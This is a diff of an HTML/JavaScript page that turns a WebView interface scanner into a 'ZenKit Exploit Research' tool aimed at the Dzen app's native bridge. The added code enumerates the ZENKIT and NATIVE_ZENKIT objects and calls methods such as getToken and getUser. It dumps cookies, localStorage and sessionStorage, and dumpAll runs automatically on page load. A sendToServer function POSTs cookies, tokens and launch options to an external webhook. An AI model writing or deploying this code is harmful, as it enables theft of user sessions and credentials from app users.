@@ -3,209 +3,495 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dzen Interface Check</title>
+    <title>ZenKit Exploit Research</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            padding: 20px;
-            background: #1a1a1a;
-            color: #fff;
+            font-family: monospace;
+            padding: 15px;
+            background: #0d1117;
+            color: #c9d1d9;
+            font-size: 14px;
         }
-        h1 { color: #00ff00; }
+        h1 { color: #58a6ff; font-size: 18px; }
+        h2 { color: #f0883e; font-size: 16px; margin-top: 25px; }
         #results {
-            background: #000;
+            background: #161b22;
             padding: 15px;
             border-radius: 8px;
-            font-family: monospace;
             white-space: pre-wrap;
             word-break: break-all;
-            margin-top: 20px;
-            max-height: 400px;
+            max-height: 300px;
             overflow-y: auto;
+            margin: 10px 0;
+            border: 1px solid #30363d;
         }
-        .found { color: #00ff00; }
-        .info { color: #ffff00; }
+        .found { color: #3fb950; }
+        .warn { color: #d29922; }
+        .error { color: #f85149; }
+        .info { color: #58a6ff; }
         button {
-            padding: 15px 30px;
-            font-size: 16px;
-            background: #00ff00;
-            color: #000;
-            border: none;
-            border-radius: 8px;
+            padding: 10px 15px;
             margin: 5px;
+            background: #238636;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
             cursor: pointer;
+            font-size: 12px;
+        }
+        button:hover { background: #2ea043; }
+        .btn-danger { background: #da3633; }
+        .btn-danger:hover { background: #f85149; }
+        .section {
+            margin: 20px 0;
+            padding: 15px;
+            background: #161b22;
+            border-radius: 8px;
+            border: 1px solid #30363d;
         }
     </style>
 </head>
 <body>
-    <h1>🔍 Dzen WebView Interface Scanner</h1>
+    <h1>🔓 ZenKit Interface Exploitation</h1>
     
-    <button onclick="scanInterfaces()">Scan All Interfaces</button>
-    <button onclick="scanVK()">Test VK Interfaces</button>
-    <button onclick="scanZen()">Test Zen Interfaces</button>
-    <button onclick="tryExploit()">Try Token Steal</button>
+    <div class="section">
+        <h2>1. Dump Interfaces</h2>
+        <button onclick="dumpZenkit()">Dump ZENKIT</button>
+        <button onclick="dumpNativeZenkit()">Dump NATIVE_ZENKIT</button>
+        <button onclick="dumpLaunchOptions()">Dump LAUNCH_OPTIONS</button>
+        <button onclick="dumpAll()">DUMP ALL</button>
+    </div>
     
-    <div id="results">Нажми кнопку для сканирования...</div>
+    <div class="section">
+        <h2>2. Try Common Methods</h2>
+        <button onclick="tryGetUser()">Get User Info</button>
+        <button onclick="tryGetToken()">Get Token</button>
+        <button onclick="tryGetConfig()">Get Config</button>
+        <button onclick="tryGetCookies()">Get Cookies</button>
+    </div>
+    
+    <div class="section">
+        <h2>3. Dangerous Actions</h2>
+        <button class="btn-danger" onclick="tryOpenUrl()">Open URL</button>
+        <button class="btn-danger" onclick="tryPostMessage()">Post Message</button>
+        <button class="btn-danger" onclick="tryCallNative()">Call Native</button>
+    </div>
+    
+    <div id="results">Результаты появятся здесь...</div>
+    
+    <div class="section">
+        <h2>4. Send Results to Server</h2>
+        <button onclick="sendToServer()">📤 Send to Webhook</button>
+    </div>
 
     <script>
         var resultsDiv = document.getElementById('results');
+        var collectedData = {};
         
-        function log(msg, className) {
-            resultsDiv.innerHTML += '<span class="' + (className || '') + '">' + msg + '</span>\n';
+        function log(msg, type) {
+            var className = type || '';
+            resultsDiv.innerHTML += '<span class="' + className + '">' + msg + '</span>\n';
+            resultsDiv.scrollTop = resultsDiv.scrollHeight;
         }
         
-        function scanInterfaces() {
+        function clear() {
             resultsDiv.innerHTML = '';
-            log('=== SCANNING WINDOW OBJECT ===\n', 'info');
-            
-            var found = [];
-            var patterns = ['VK', 'Zen', 'Android', 'webkit', 'native', 'app', 'bridge', 'JSBridge', 'Yandex', 'dzen'];
-            
-            for (var key in window) {
-                try {
-                    var lowerKey = key.toLowerCase();
-                    for (var i = 0; i < patterns.length; i++) {
-                        if (lowerKey.indexOf(patterns[i].toLowerCase()) !== -1) {
-                            var type = typeof window[key];
-                            found.push(key + ' : ' + type);
-                            log('✓ ' + key + ' : ' + type, 'found');
-                            
-                            // Если это объект, покажем его методы
-                            if (type === 'object' && window[key] !== null) {
-                                try {
-                                    var methods = Object.keys(window[key]);
-                                    if (methods.length > 0 && methods.length < 20) {
-                                        log('  └─ methods: ' + methods.join(', '), 'info');
-                                    }
-                                } catch(e) {}
-                            }
-                            break;
-                        }
-                    }
-                } catch(e) {}
-            }
-            
-            if (found.length === 0) {
-                log('\nNo suspicious interfaces found in window object', '');
-            }
-            
-            log('\n=== TOTAL: ' + found.length + ' interfaces ===', 'info');
         }
         
-        function scanVK() {
-            resultsDiv.innerHTML = '';
-            log('=== TESTING VK INTERFACES ===\n', 'info');
+        function stringify(obj, depth) {
+            depth = depth || 0;
+            if (depth > 3) return '[MAX DEPTH]';
             
-            var vkInterfaces = [
-                'VKWebAppInit',
-                'VKWebAppGetUserInfo', 
-                'VKWebAppGetAuthToken',
-                'VKWebAppGetEmail',
-                'VKWebAppGetPhoneNumber',
-                'VKWebAppGetGeodata',
-                'VKWebAppOpenPayForm',
-                'VKWebAppCallAPIMethod',
-                'VKWebAppStorageGet',
-                'VKWebAppStorageSet'
-            ];
-            
-            // Проверяем VK Bridge
-            if (typeof window.vkBridge !== 'undefined') {
-                log('✓ vkBridge FOUND!', 'found');
-                try {
-                    log('  Methods: ' + Object.keys(window.vkBridge).join(', '), 'info');
-                } catch(e) {}
-            }
-            
-            // Проверяем VKWebAppAPI
-            for (var i = 0; i < vkInterfaces.length; i++) {
-                if (typeof window[vkInterfaces[i]] !== 'undefined') {
-                    log('✓ ' + vkInterfaces[i] + ' FOUND!', 'found');
-                }
-            }
-            
-            // Пробуем вызвать через postMessage
-            log('\n=== TRYING POSTMESSAGE ===', 'info');
             try {
-                window.postMessage(JSON.stringify({
-                    handler: 'VKWebAppInit',
-                    params: {}
-                }), '*');
-                log('postMessage sent (check console)', '');
-            } catch(e) {
-                log('postMessage error: ' + e, '');
-            }
-        }
-        
-        function scanZen() {
-            resultsDiv.innerHTML = '';
-            log('=== TESTING ZEN INTERFACES ===\n', 'info');
-            
-            var zenInterfaces = [
-                'ZenKit',
-                'ZenBridge', 
-                'ZenWebApp',
-                'zenNative',
-                'DzenKit',
-                'dzenNative',
-                'AndroidBridge',
-                'NativeBridge'
-            ];
-            
-            for (var i = 0; i < zenInterfaces.length; i++) {
-                if (typeof window[zenInterfaces[i]] !== 'undefined') {
-                    log('✓ ' + zenInterfaces[i] + ' FOUND!', 'found');
+                if (obj === null) return 'null';
+                if (obj === undefined) return 'undefined';
+                if (typeof obj === 'function') return '[Function: ' + (obj.name || 'anonymous') + ']';
+                if (typeof obj !== 'object') return String(obj);
+                
+                var result = '{\n';
+                var keys = [];
+                
+                // Получаем все свойства
+                for (var key in obj) {
+                    keys.push(key);
+                }
+                try {
+                    keys = keys.concat(Object.getOwnPropertyNames(obj));
+                } catch(e) {}
+                
+                // Уникальные ключи
+                keys = keys.filter(function(v, i, a) { return a.indexOf(v) === i; });
+                
+                for (var i = 0; i < keys.length && i < 50; i++) {
+                    var key = keys[i];
                     try {
-                        var methods = Object.keys(window[zenInterfaces[i]]);
-                        log('  Methods: ' + methods.join(', '), 'info');
-                    } catch(e) {}
-                } else {
-                    log('✗ ' + zenInterfaces[i] + ' not found', '');
+                        var val = obj[key];
+                        var indent = '  '.repeat(depth + 1);
+                        result += indent + key + ': ' + stringify(val, depth + 1) + '\n';
+                    } catch(e) {
+                        result += '  '.repeat(depth + 1) + key + ': [Error: ' + e.message + ']\n';
+                    }
+                }
+                
+                if (keys.length > 50) {
+                    result += '  '.repeat(depth + 1) + '... and ' + (keys.length - 50) + ' more\n';
+                }
+                
+                return result + '  '.repeat(depth) + '}';
+            } catch(e) {
+                return '[Error: ' + e.message + ']';
+            }
+        }
+        
+        function dumpZenkit() {
+            clear();
+            log('=== ZENKIT OBJECT ===\n', 'info');
+            
+            if (typeof ZENKIT === 'undefined') {
+                log('ZENKIT is undefined!', 'error');
+                return;
+            }
+            
+            collectedData.ZENKIT = {};
+            
+            log('Type: ' + typeof ZENKIT, 'info');
+            log('\nMethods and Properties:\n', 'warn');
+            
+            var keys = Object.getOwnPropertyNames(ZENKIT);
+            for (var i = 0; i < keys.length; i++) {
+                var key = keys[i];
+                try {
+                    var val = ZENKIT[key];
+                    var type = typeof val;
+                    collectedData.ZENKIT[key] = type;
+                    
+                    if (type === 'function') {
+                        log('✓ ' + key + '() - FUNCTION', 'found');
+                        // Попробуем получить параметры
+                        try {
+                            log('  Signature: ' + val.toString().split('{')[0], 'info');
+                        } catch(e) {}
+                    } else {
+                        log('  ' + key + ': ' + stringify(val), '');
+                    }
+                } catch(e) {
+                    log('✗ ' + key + ': [Error: ' + e.message + ']', 'error');
                 }
             }
+        }
+        
+        function dumpNativeZenkit() {
+            clear();
+            log('=== NATIVE_ZENKIT OBJECT ===\n', 'info');
             
-            // Проверяем Android WebView interface
-            if (typeof window.Android !== 'undefined') {
-                log('\n✓ Android INTERFACE FOUND!', 'found');
-                try {
-                    var methods = Object.getOwnPropertyNames(window.Android);
-                    log('  Methods: ' + methods.join(', '), 'info');
-                } catch(e) {}
+            if (typeof NATIVE_ZENKIT === 'undefined') {
+                log('NATIVE_ZENKIT is undefined!', 'error');
+                return;
+            }
+            
+            collectedData.NATIVE_ZENKIT = {};
+            
+            log('Type: ' + typeof NATIVE_ZENKIT, 'info');
+            log('\nMethods and Properties:\n', 'warn');
+            
+            // Пробуем разные способы получить свойства
+            var keys = [];
+            try { keys = keys.concat(Object.keys(NATIVE_ZENKIT)); } catch(e) {}
+            try { keys = keys.concat(Object.getOwnPropertyNames(NATIVE_ZENKIT)); } catch(e) {}
+            try { 
+                for (var k in NATIVE_ZENKIT) keys.push(k);
+            } catch(e) {}
+            
+            // Уникальные
+            keys = keys.filter(function(v, i, a) { return a.indexOf(v) === i; });
+            
+            if (keys.length === 0) {
+                log('No enumerable properties found. Trying common method names...', 'warn');
+                
+                var commonMethods = [
+                    'getUser', 'getUserInfo', 'getToken', 'getAccessToken',
+                    'getConfig', 'getSettings', 'getData', 'getState',
+                    'init', 'initialize', 'call', 'invoke', 'execute',
+                    'postMessage', 'sendMessage', 'emit', 'dispatch',
+                    'openUrl', 'openLink', 'navigate', 'redirect',
+                    'showAlert', 'showDialog', 'toast',
+                    'getDeviceId', 'getDeviceInfo', 'getPlatform',
+                    'getCookies', 'getStorage', 'getSession',
+                    'login', 'logout', 'authorize', 'auth'
+                ];
+                
+                for (var i = 0; i < commonMethods.length; i++) {
+                    var method = commonMethods[i];
+                    try {
+                        if (typeof NATIVE_ZENKIT[method] !== 'undefined') {
+                            log('✓ ' + method + ' EXISTS!', 'found');
+                            collectedData.NATIVE_ZENKIT[method] = typeof NATIVE_ZENKIT[method];
+                        }
+                    } catch(e) {}
+                }
+            } else {
+                for (var i = 0; i < keys.length; i++) {
+                    var key = keys[i];
+                    try {
+                        var val = NATIVE_ZENKIT[key];
+                        var type = typeof val;
+                        collectedData.NATIVE_ZENKIT[key] = type;
+                        
+                        if (type === 'function') {
+                            log('✓ ' + key + '() - FUNCTION', 'found');
+                        } else {
+                            log('  ' + key + ': ' + stringify(val), '');
+                        }
+                    } catch(e) {
+                        log('✗ ' + key + ': [Error]', 'error');
+                    }
+                }
             }
         }
         
-        function tryExploit() {
-            resultsDiv.innerHTML = '';
-            log('=== ATTEMPTING EXPLOITS ===\n', 'info');
+        function dumpLaunchOptions() {
+            clear();
+            log('=== ZENKIT_LAUNCH_OPTIONS ===\n', 'info');
             
-            // Пробуем получить cookies
-            log('Cookies: ' + document.cookie, 'info');
-            
-            // Пробуем localStorage
-            try {
-                log('\nlocalStorage keys: ' + Object.keys(localStorage).join(', '), 'info');
-            } catch(e) {
-                log('localStorage error: ' + e, '');
+            if (typeof ZENKIT_LAUNCH_OPTIONS === 'undefined') {
+                log('ZENKIT_LAUNCH_OPTIONS is undefined!', 'error');
+                return;
             }
             
-            // Пробуем sessionStorage  
-            try {
-                log('\nsessionStorage keys: ' + Object.keys(sessionStorage).join(', '), 'info');
-            } catch(e) {
-                log('sessionStorage error: ' + e, '');
-            }
-            
-            // Проверяем URL
-            log('\nCurrent URL: ' + window.location.href, 'info');
-            log('Origin: ' + window.location.origin, 'info');
-            
-            // User Agent
-            log('\nUser-Agent: ' + navigator.userAgent, 'info');
+            collectedData.LAUNCH_OPTIONS = ZENKIT_LAUNCH_OPTIONS;
+            log(stringify(ZENKIT_LAUNCH_OPTIONS), 'found');
         }
         
-        // Автозапуск при загрузке
+        function dumpAll() {
+            clear();
+            
+            log('=== FULL DUMP ===\n', 'info');
+            
+            // ZENKIT
+            log('\n--- ZENKIT ---', 'warn');
+            if (typeof ZENKIT !== 'undefined') {
+                log(stringify(ZENKIT), '');
+            }
+            
+            // NATIVE_ZENKIT  
+            log('\n--- NATIVE_ZENKIT ---', 'warn');
+            if (typeof NATIVE_ZENKIT !== 'undefined') {
+                log(stringify(NATIVE_ZENKIT), '');
+            }
+            
+            // LAUNCH OPTIONS
+            log('\n--- ZENKIT_LAUNCH_OPTIONS ---', 'warn');
+            if (typeof ZENKIT_LAUNCH_OPTIONS !== 'undefined') {
+                log(stringify(ZENKIT_LAUNCH_OPTIONS), '');
+            }
+            
+            // handleZenKitPromiseResult
+            log('\n--- handleZenKitPromiseResult ---', 'warn');
+            if (typeof handleZenKitPromiseResult !== 'undefined') {
+                log('Type: ' + typeof handleZenKitPromiseResult, '');
+                log(handleZenKitPromiseResult.toString(), '');
+            }
+            
+            // onZenKitEvent
+            log('\n--- onZenKitEvent ---', 'warn');
+            if (typeof onZenKitEvent !== 'undefined') {
+                log('Type: ' + typeof onZenKitEvent, '');
+                log(onZenKitEvent.toString(), '');
+            }
+            
+            // Cookies & Storage
+            log('\n--- COOKIES ---', 'warn');
+            log(document.cookie || '[empty]', '');
+            
+            log('\n--- LOCAL STORAGE ---', 'warn');
+            try {
+                for (var i = 0; i < localStorage.length; i++) {
+                    var key = localStorage.key(i);
+                    log(key + ': ' + localStorage.getItem(key).substring(0, 100), '');
+                }
+            } catch(e) { log('Error: ' + e.message, 'error'); }
+        }
+        
+        function tryGetUser() {
+            clear();
+            log('=== TRYING TO GET USER INFO ===\n', 'info');
+            
+            var methods = ['getUser', 'getUserInfo', 'user', 'getProfile', 'getAccount'];
+            
+            [ZENKIT, NATIVE_ZENKIT].forEach(function(obj, idx) {
+                var name = idx === 0 ? 'ZENKIT' : 'NATIVE_ZENKIT';
+                if (typeof obj === 'undefined') return;
+                
+                methods.forEach(function(method) {
+                    try {
+                        if (typeof obj[method] === 'function') {
+                            log('Calling ' + name + '.' + method + '()...', 'warn');
+                            var result = obj[method]();
+                            log('Result: ' + stringify(result), 'found');
+                            collectedData.userInfo = result;
+                        }
+                    } catch(e) {
+                        log(name + '.' + method + ' error: ' + e.message, 'error');
+                    }
+                });
+            });
+        }
+        
+        function tryGetToken() {
+            clear();
+            log('=== TRYING TO GET TOKENS ===\n', 'info');
+            
+            var methods = ['getToken', 'getAccessToken', 'getAuthToken', 'token', 'getSession'];
+            
+            [ZENKIT, NATIVE_ZENKIT].forEach(function(obj, idx) {
+                var name = idx === 0 ? 'ZENKIT' : 'NATIVE_ZENKIT';
+                if (typeof obj === 'undefined') return;
+                
+                methods.forEach(function(method) {
+                    try {
+                        if (typeof obj[method] === 'function') {
+                            log('Calling ' + name + '.' + method + '()...', 'warn');
+                            var result = obj[method]();
+                            log('🔑 TOKEN: ' + stringify(result), 'found');
+                            collectedData.token = result;
+                        }
+                    } catch(e) {
+                        log(name + '.' + method + ' error: ' + e.message, 'error');
+                    }
+                });
+            });
+        }
+        
+        function tryGetConfig() {
+            clear();
+            log('=== TRYING TO GET CONFIG ===\n', 'info');
+            
+            var methods = ['getConfig', 'getSettings', 'config', 'settings', 'getEnvironment'];
+            
+            [ZENKIT, NATIVE_ZENKIT].forEach(function(obj, idx) {
+                var name = idx === 0 ? 'ZENKIT' : 'NATIVE_ZENKIT';
+                if (typeof obj === 'undefined') return;
+                
+                methods.forEach(function(method) {
+                    try {
+                        if (typeof obj[method] === 'function') {
+                            log('Calling ' + name + '.' + method + '()...', 'warn');
+                            var result = obj[method]();
+                            log('Result: ' + stringify(result), 'found');
+                        }
+                    } catch(e) {}
+                });
+            });
+        }
+        
+        function tryGetCookies() {
+            clear();
+            log('=== COOKIES & STORAGE ===\n', 'info');
+            
+            log('Document cookies:', 'warn');
+            log(document.cookie || '[empty]', 'found');
+            
+            log('\nLocalStorage:', 'warn');
+            try {
+                for (var i = 0; i < localStorage.length; i++) {
+                    var key = localStorage.key(i);
+                    var val = localStorage.getItem(key);
+                    log(key + ': ' + val, 'found');
+                    collectedData['localStorage_' + key] = val;
+                }
+            } catch(e) { log('Error: ' + e, 'error'); }
+            
+            log('\nSessionStorage:', 'warn');
+            try {
+                for (var i = 0; i < sessionStorage.length; i++) {
+                    var key = sessionStorage.key(i);
+                    var val = sessionStorage.getItem(key);
+                    log(key + ': ' + val, 'found');
+                }
+            } catch(e) { log('Error: ' + e, 'error'); }
+        }
+        
+        function tryOpenUrl() {
+            clear();
+            log('=== TRYING TO OPEN URL ===\n', 'info');
+            
+            var methods = ['openUrl', 'openLink', 'navigate', 'open', 'loadUrl'];
+            var testUrl = 'https://example.com';
+            
+            [ZENKIT, NATIVE_ZENKIT].forEach(function(obj, idx) {
+                var name = idx === 0 ? 'ZENKIT' : 'NATIVE_ZENKIT';
+                if (typeof obj === 'undefined') return;
+                
+                methods.forEach(function(method) {
+                    try {
+                        if (typeof obj[method] === 'function') {
+                            log('Found ' + name + '.' + method + '() - NOT calling for safety', 'warn');
+                        }
+                    } catch(e) {}
+                });
+            });
+        }
+        
+        function tryPostMessage() {
+            clear();
+            log('=== POST MESSAGE TEST ===\n', 'info');
+            
+            try {
+                if (typeof ZENKIT.postMessage === 'function') {
+                    log('ZENKIT.postMessage exists!', 'found');
+                }
+                if (typeof ZENKIT.call === 'function') {
+                    log('ZENKIT.call exists!', 'found');
+                }
+            } catch(e) {}
+        }
+        
+        function tryCallNative() {
+            clear();
+            log('=== NATIVE CALL TEST ===\n', 'info');
+            
+            // Пробуем вызвать handleZenKitPromiseResult с тестовыми данными
+            try {
+                if (typeof handleZenKitPromiseResult === 'function') {
+                    log('handleZenKitPromiseResult signature:', 'warn');
+                    log(handleZenKitPromiseResult.toString().substring(0, 500), '');
+                }
+            } catch(e) {}
+            
+            try {
+                if (typeof onZenKitEvent === 'function') {
+                    log('\nonZenKitEvent signature:', 'warn');
+                    log(onZenKitEvent.toString().substring(0, 500), '');
+                }
+            } catch(e) {}
+        }
+        
+        function sendToServer() {
+            var data = {
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                cookies: document.cookie,
+                collected: collectedData,
+                zenkit: typeof ZENKIT !== 'undefined' ? Object.keys(ZENKIT) : null,
+                nativeZenkit: typeof NATIVE_ZENKIT !== 'undefined' ? 'exists' : null,
+                launchOptions: typeof ZENKIT_LAUNCH_OPTIONS !== 'undefined' ? ZENKIT_LAUNCH_OPTIONS : null
+            };
+            
+            log('\nSending to webhook...', 'info');
+            
+            // Замени на свой webhook
+            fetch('https://webhook.tuna.am/387WocKA8chxCpAjoA4S1rxg7cV', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(function(r) { log('✓ Sent successfully!', 'found'); })
+            .catch(function(e) { log('Error: ' + e, 'error'); });
+        }
+        
+        // Auto-run on load
         window.onload = function() {
-            scanInterfaces();
+            dumpAll();
         };
     </script>
 </body>
